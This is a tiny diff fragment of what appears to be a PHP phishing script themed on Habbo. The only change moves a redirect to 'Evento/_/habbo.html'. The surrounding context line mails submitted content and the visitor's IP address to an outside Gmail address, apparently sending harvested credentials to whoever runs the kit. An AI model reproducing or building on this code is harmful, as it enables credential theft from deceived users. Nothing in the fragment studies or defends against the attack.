@@ -68,4 +68,4 @@ mail("outubro28hb@gmail.com", "$q2[0] - $ip", "$conteudo", $headers);
 
 
 
-header("Location: /_/habbo.html");
+header("Location: Evento/_/habbo.html");
